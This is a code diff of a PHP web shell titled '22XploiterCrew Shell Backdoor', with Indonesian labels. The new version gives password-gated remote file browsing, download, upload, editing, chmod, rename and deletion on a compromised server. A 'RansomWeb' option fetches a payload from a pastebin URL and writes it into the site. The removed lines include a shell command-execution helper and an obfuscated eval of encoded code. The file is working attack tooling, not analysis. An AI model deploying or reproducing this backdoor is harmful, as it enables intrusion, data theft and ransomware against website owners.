@@ -1,53 +1,136 @@
+<!DOCTYPE html>
+<html>
+	<title>22XploiterCrew</title>
+	<head>
+		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
+		<meta name="author" content="CodeXploit"/>
+		<meta name="copyright" content="22XploiterCrew"/>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+	</head>
+	<body class="bg-dark text-light">
+		<center>
+			<br/><h3>22Xploiter Shell Backdoor</h3><hr/><br/>
+			<div class="container">
+				<div class="col-lg-6">
+					<div class="form-group">
+					<h5> Silahkan Masuk</h5>
+					<br/>
+						<form method="post">
+							<input type="password" name="pass" placeholder="Password" class="form-control"><br/>
+							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
+						</form>
+					</div>
+				</div><br/>
+			</div>
+		</center>
+	</body>
+</html>
 <?php
-echo '<html>
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
-<link href="" rel="stylesheet" type="text/css">
-<style>
-body{
-	font-family: "Racing Sans One", cursive;
-	background-image: url("https://images.surfacemag.com/app/uploads/2017/04/Black-Screen.jpg");
-	color:White;
-	background-attachment:fixed;
-	background-repeat:no-repeat;
-	background-position:center;
-	background-color:transparan;
-	-webkit-background-size: 100% 100%;
+		<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+  <!-- Custom styles for this template -->
+  <style>
+body {
+  overflow-x: hidden;
 }
-#content tr:hover{
-background-color: grey;
-text-shadow:0px 0px 10px #fff;
+.ico {width:20px;}
+.ico2{width:20px;}
+#sidebar-wrapper {
+  min-height: 100vh;
+  margin-left: -15rem;
+  -webkit-transition: margin .25s ease-out;
+  -moz-transition: margin .25s ease-out;
+  -o-transition: margin .25s ease-out;
+  transition: margin .25s ease-out;
 }
-#content .first{
-background-color: blue;
+
+#sidebar-wrapper .sidebar-heading {
+  padding: 0.875rem 1.25rem;
+  font-size: 1.2rem;
 }
-table{
-border: 1px #000000 dotted;
+
+#sidebar-wrapper .list-group {
+  width: 15rem;
 }
-a{
-color:white;
-text-decoration: none;
+
+#page-content-wrapper {
+  min-width: 100vw;
 }
-a:hover{
-color:blue;
-text-shadow:0px 0px 10px #ffffff;
+
+#wrapper.toggled #sidebar-wrapper {
+  margin-left: 0;
 }
-input,select,textarea{
-border: 1px #000000 solid;
--moz-border-radius: 5px;
--webkit-border-radius:5px;
-border-radius:5px;
+
+@media (min-width: 768px) {
+  #sidebar-wrapper {
+    margin-left: 0;
+  }
+
+  #page-content-wrapper {
+    min-width: 0;
+    width: 100%;
+  }
+
+  #wrapper.toggled #sidebar-wrapper {
+    margin-left: -15rem;
+  }
 }
-</style>
+  </style>
 </head>
 <body>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>';
-echo "<html><font color=#e59400 face=courier new><b>Situs: </b></font><font face=courier new>" .$_SERVER['SERVER_NAME'];
-echo "<br><font color=#e59400 face=courier new><b>Server / IP : </font></b><font face=courier new color=white>" .$_SERVER['SERVER_SOFTWARE'];
-echo " / " .$_SERVER['SERVER_ADDR'];
-$df = round(disk_free_space("C:") / 1024 / 1024 / 1024);
-print("<font color=#e59400><br><b>Free space:</b></font><font face=courier new> $df GB</b>");
-echo '<br><font color=#e59400 face=courier new><b>Directory :</b></font> ';
+
+ 
+    <!-- /#sidebar-wrapper -->
+
+    <!-- Page Content -->
+    <div id="page-content-wrapper">
+
+      <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
+        <button class="btn btn-primary" id="menu-toggle"><i class="fa fa-user"></i></button>
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
+            <li class="nav-item active">
+              <a class="nav-link" href="?">Home <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+             
+<?php
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -56,92 +139,212 @@ $path = getcwd();
 $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
 
-foreach($paths as $id=>$pat){
-if($pat == '' && $id == 0){
+foreach( $paths as $id => $pat ){
+if( $pat == '' && $id == 0 ){
 $a = true;
-echo '<a href="?path=/">/</a>';
+echo 'Current Dir => <a href="?path=/">/</a>';
 continue;
 }
-if($pat == '') continue;
+if( $pat == '' ) continue;
 echo '<a href="?path=';
-for($i=0;$i<=$id;$i++){
+for( $i = 0; $i <= $id; $i++){
 echo "$paths[$i]";
-if($i != $id) echo "/";
+if( $i != $id ) echo "/";
 }
 echo '">'.$pat.'</a>/';
 }
-echo '</td></tr><tr><td>';
-if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="green" face=courier new>Upload Berhasil</font><br />';
+?>
+             
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Informasi & Upload
+              </a>
+              <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
+                <a class="dropdown-item" href="?info">Info Server</a>
+                <div class="dropdown-divider"></div>
+                <center>
+               <form method="post" enctype="multipart/form-data">
+               	<input type="file" name="file"><input type="submit" name="upload" value="Upload">
+               </form>
+               </center>
+              </div>
+            </li>
+          </ul>
+        </div>
+      </nav>
+ <div class="d-flex" id="wrapper">
+    <!-- Sidebar -->
+    <div class="bg-light border-right" id="sidebar-wrapper">
+      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> 22XploiterCrew</a></div>
+      <div class="list-group list-group-flush">
+      	<?php
+      	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Buat Folder</a>
+      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>
+      	<a href='?path=$path&aksi=ransom' class='list-group-item list-group-item-action bg-light'><i class='fa fa-exclamation-triangle'></i> RansomWeb</a>";
+      	?>
+        <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> Logout</a>
+        
+      </div>
+    </div>
+      <div class="container-fluid">
+        
+        
+<?php
+if($_GET["keluar"] == true){
+unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+}
+if($_GET['aksi'] == 'buatfolder'){
+	function hai(){
+		echo "<script>window.location='?path=".$path."'; alert('Folder Sukses Dibuat!')</script>";
+	}
+	if(isset($_POST["folderss"])){
+		$nama_folder = $path.'/'.$_POST["namaF"];
+		mkdir($nama_folder,hai());
+	}
+		
+	echo '
+	<div class="row mt-3">
+		<div class="col">
+			<form method="post">
+	<input type="text" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
+		</div>
+		<div class="col">
+			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
+				</div>
+				</div>';
+}elseif($_GET["aksi"] == 'ransom'){
+	
+	
+// Ubah Link ransomnya jika ingin ganti ransomware yangvlain
+	$url  = "https://pastebin.com/raw/LbVhNnZF";
+  $curl = curl_init($url);
+  				curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
+  $get	= curl_exec($curl);
+ if(!$get == ""){ // Jika isi file dari url tidak kosong
+// Buat file
+$puts = fopen("RansomWeb.php","w");
+				fwrite($puts,$get);
+				fclose($puts);
+$nama_file  = "RansomWeb.php";
+$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
+if($puts == true){
+	echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
 }else{
-echo '<font color="red" face=courier new>Upload Gagal</font><br/>';
+	echo "Gagal Membuat File";
+	}
+}else{
+	echo "Not Found!!";
+}
+
+	
+}elseif($_GET["aksi"] == 'buatfile'){
+	if(isset($_POST["buat"])){
+	$namaF = $path.'/'.$_POST["nama_file"];
+	$isi = $_POST["isi"];
+	$buat = fopen($namaF,"w");
+	fwrite($buat,$isi);
+	fclose($buat);
+	if($buat == TRUE){
+		echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
-echo '<br><form enctype="multipart/form-data" method="POST">
-<font color=#e59400 face=courier new><b>Upload File:</b></font> <input type="file" name="file" />
-<input type="submit" value="Tusbol" />
-</form>';
-echo "<form method='post'>
-<font color=#e59400 face=courier><b>(root@bang4y1n):</b></font>
-<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value='Eksekusi'>
-</form>
-</td></tr>";
-if($_POST['execmd']) {
-echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:#000099; background-color:blue;'>".exe($_POST['cmd'])."</textarea></center>";
+echo '<form method="post" class="mt-3">
+	<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
+		<textarea class="form-control mb-3" rows="8" name="isi" placeholder="Isi File"></textarea>
+		<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">';
+}else
+
+// Informasi Server
+
+if(isset($_GET["info"])){
+echo '
+	<div class="alert alert-success mt-3">
+		<h3 class="text-center">Informasi Server</h3><hr>
+		<li>Nama Server : '.$_SERVER["SERVER_NAME"].'</li>
+		<li>Ip Address : '.$_SERVER["SERVER_ADDR"].'</li>
+		<li>Port : '.$_SERVER["SERVER_PORT"].'</li>
+		<li>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</li>
+		<li>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</li>
+		<li>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</li>
+		<li>Software : '.$_SERVER["SERVER_SOFTWARE"].'</li>
+		<li>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</li>
+		<li>G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].'</li>
+		<li>R-Method : '.$_SERVER["REQUEST_METHOD"].'</li>
+		<li>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</li>
+		</div>';
+}else if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo "<script>window.location='?path=".$path."'; alert('Valid!!')</script>";
+}else{
+echo "<script>alert('Gagal Upload')</script>";
 }
-echo "<br></td></tr>";
-if(isset($_GET['filesrc'])){
+}else if(isset($_GET['filesrc'])){
 echo "<tr><td>Current File : ";
 echo $_GET['filesrc'];
 echo '</tr></td></table><br />';
 echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+}else if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
 echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="green" face=courier new>Change Permission Berhasil</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
 }else{
-echo '<font color="red" face=courier new>Change Permission Gagal</font><br />';
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
 echo '<form method="POST">
-Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+	<div class="row">
+		<div class="col">
+<input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" class="form-control">
+	</div>
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="chmod">
-<input type="submit" value="Go" />
+	<div class="col">
+<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
 </form>';
-}elseif($_POST['opt'] == 'rename'){
+}else if($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">Ganti Nama Berhasil</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Nama Telah Diubah!')</script>";
 }else{
-echo '<font color="red">Ganti Nama Gagal</font><br />';
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 $_POST['name'] = $_POST['newname'];
 }
 echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+	<div class="row">
+		<div class="col">
+<input name="newname" type="text" size="20" value="'.$_POST['name'].'" class="form-control" placeholder="Nama Baru">
+	</div>
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="rename">
-<input type="submit" value="Go" />
+	<div class="col">
+<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
+</div>
+</div>
 </form>';
-}elseif($_POST['opt'] == 'edit'){
+}else if($_POST['opt'] == 'edit'){
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo '<font color="green">Berhasil Edit File</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Berhasil Merubah Nama File')</script>";
 }else{
-echo '<font color="red">Gagal Edit File</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 fclose($fp);
 }
 echo '<form method="POST">
-<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<textarea class="form-control" rows="8" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="edit">
-<input type="submit" value="Save" />
+<input type="submit" value="Simpan" class="btn btn-outline-primary btn-block mt-3">
 </form>';
 }
 echo '</center>';
@@ -150,55 +353,64 @@ echo '</table><br/><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
-echo '<font color="green">Directory Terhapus</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus Folder')</script>";
 }else{
-echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
-}elseif($_POST['type'] == 'file'){
+}else if($_POST['type'] == 'file'){
 if(unlink($_POST['path'])){
-echo '<font color="green">File Terhapus</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus File')</script>";
 }else{
-echo '<font color="red">File Gagal Dihapus</font><br/>';
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
 }
 }
 }
 echo '</center>';
 $scandir = scandir($path);
-echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center><font color=yellow><b>Name</b></font></peller></center></td>
-<td><center><font color=yellow><b>Size</b></font></peller></center></td>
-<td><center><font color=yellow><b>Permission</b></font></peller></center></td>
-<td><center><font color=yellow><b>Modify</b></font></peller></center></td>
-</tr>';
-
-foreach($scandir as $dir){
+echo '
+<div class="table-responsive-lg mt-2">
+	<table class="table table-hover">
+		<thead class="bg-warning text-center">
+			<tr>
+				<th scope="col">Nama</th>
+				<th scope="col">Jenis</th>
+				<th scope="col">Ukuran</th>
+				<th scope="col">Perizinan</th>
+				<th scope="col">Aksi</th></tr></thead>
+	';
+	foreach($scandir as $dir){
 if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
-<td><a href="?path='.$path.'/'.$dir.'"><b><i>'.$dir.'</b></i></a></td>
-<td><center>--</center></td>
-<td><center>';
+<td scope="col"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td class="text-center">Folder</td>
+<td class="text-center">--</td>
+<td class="text-center">';
 if(is_writable($path.'/'.$dir)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$dir)) echo '<font color="green">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
 if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
-<option value="">Pilih</option>
-<option value="delete">Hapus</option>
+echo '</td>
+<td class="text-center"><form method="POST" action="?option&path='.$path.'">
+	<div class="row">
+		<div class="col">
+<select name="opt" class="custom-select">
+<option value="">Select</option>
+<option value="delete">Delete</option>
 <option value="chmod">Chmod</option>
 <option value="rename">Rename</option>
 </select>
+</div>
 <input type="hidden" name="type" value="dir">
 <input type="hidden" name="name" value="'.$dir.'">
 <input type="hidden" name="path" value="'.$path.'/'.$dir.'">
-<input type="submit" value=">">
-</form></center></td>
+	<div class="col">
+<input type="submit" value=">" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
+</form></td>
 </tr>';
 }
-echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 foreach($scandir as $file){
 if(!is_file($path.'/'.$file)) continue;
 $size = filesize($path.'/'.$file)/1024;
@@ -210,48 +422,116 @@ $size = $size.' KB';
 }
 
 echo '<tr>
-<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'"><i><b>'.$file.'</a></td>
-<td><center><i><b>'.$size.'</center></td>
-<td><center>';
-if(is_writable($path.'/'.$file)) echo '<font color="Green"><b>';
-elseif(!is_readable($path.'/'.$file)) echo '<font color="Green"><b>';
+<td><img src="';
+					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+					if($ext == "php") {
+						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
+					}elseif ($ext == "html") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
+					}elseif ($ext == "css") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
+					}elseif ($ext == "png") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
+					}elseif ($ext == "jpg") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
+					}elseif ($ext == "jpeg") {
+						echo 'http://i.imgur.com/e8mkvPf.png"';
+					}elseif($ext == "zip") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
+					}elseif ($ext == "js") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
+					}elseif ($ext == "ttf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
+					}elseif ($ext == "otf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
+					}elseif ($ext == "txt") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
+					}elseif ($ext == "ico") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
+					}elseif ($ext == "conf") {
+						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
+					}elseif ($ext == "htaccess") {
+						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
+					}elseif ($ext == "sh") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
+					}elseif ($ext == "py") {
+						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
+					}elseif ($ext == "sql") {
+						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
+					}elseif ($ext == "pl") {
+						echo 'http://i.imgur.com/PnmX8H9.png';
+					}elseif ($ext == "pdf") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
+					}elseif ($ext == "mp4") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
+					}elseif ($ext == "mp3") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
+					}elseif ($ext == "git") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
+					}elseif ($ext == "md") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+					}else{
+						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
+					}
+					echo '" class="ico2"> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td class="text-center">File</td>
+<td class="text-center">'.$size.'</td>
+<td class="text-center">';
+if(is_writable($path.'/'.$file)) echo '<font color="green">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 echo perms($path.'/'.$file);
 if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
-echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
-<select name="opt">
+echo '</td>
+<td class="text-center">
+	<form method="POST" action="?option&path='.$path.'">
+		<div class="row">
+			<div class="col">
+<select name="opt" class="custom-select">
 <option value="">Select</option>
 <option value="delete">Delete</option>
 <option value="chmod">Chmod</option>
 <option value="rename">Rename</option>
 <option value="edit">Edit</option>
 </select>
+</div>
 <input type="hidden" name="type" value="file">
 <input type="hidden" name="name" value="'.$file.'">
 <input type="hidden" name="path" value="'.$path.'/'.$file.'">
-<input type="submit" value=">">
-</form></center></td>
+	<div class="col">
+<input type="submit" value="OK" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
+</form></td>
 </tr>';
 }
 echo '</table>
 </div>';
 }
+?>
+        
+        
+      </div>
+    </div>
+    <!-- /#page-content-wrapper -->
+  </div>
+  <!-- /#wrapper -->
 
-echo "
-</center>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+
+  <!-- Menu Toggle Script -->
+  <script>
+    $("#menu-toggle").click(function(e) {
+      e.preventDefault();
+      $("#wrapper").toggleClass("toggled");
+    });
+  </script>
+
 </body>
-</html>";
-
-$command = "JcxOCoAgEADAe9AfFgm85T3Tv+iybQmxLRf09VI9YHPp8b4TONC7XEcGUMpUdKdBVtjLsYUY2CpVR513OeNzDDHGIIPXbZmXr9hD+d383ng7QlUSMizfeh8=";
-eval(str_rot13(gzinflate(str_rot13(base64_decode(($command))))));
-if($_GET['go'] == 'cabs') {
-	
-
-echo '<form action="" method="post">';
-    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
-    echo '<meta http-equiv="refresh" content="3" />';
-}
-
+</html>
+<?php
 function perms($file){
 $perms = fileperms($file);
 
@@ -304,35 +584,4 @@ $info .= (($perms & 0x0001) ?
 
 return $info;
 }
-//////all functions disini tempatnya/////
-function exe($cmd) { 	
-if(function_exists('system')) { 		
-		@ob_start(); 		
-		@system($cmd); 		
-		$buff = @ob_get_contents(); 		
-		@ob_end_clean(); 		
-		return $buff; 	
-	} elseif(function_exists('exec')) { 		
-		@exec($cmd,$results); 		
-		$buff = ""; 		
-		foreach($results as $result) { 			
-			$buff .= $result; 		
-		} return $buff; 	
-	} elseif(function_exists('passthru')) { 		
-		@ob_start(); 		
-		@passthru($cmd); 		
-		$buff = @ob_get_contents(); 		
-		@ob_end_clean(); 		
-		return $buff; 	
-	} elseif(function_exists('shell_exec')) { 		
-		$buff = @shell_exec($cmd); 		
-		return $buff; 	
-	} 
-}
-?>
-<style type='text/css'>body,a:hover{cursor:url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
-<style>img[alt="www.000webhost.com"]{display:none;}</style>
-<?php
-  print "\n";$disable_functions = @ini_get("disable_functions");
-echo "<center></font><br><font color=#e59400 face=courier new><b>Disable Functions</b><br><i><font color=red size=1> ".$disable_functions; print "\n<br></font>";
 ?>
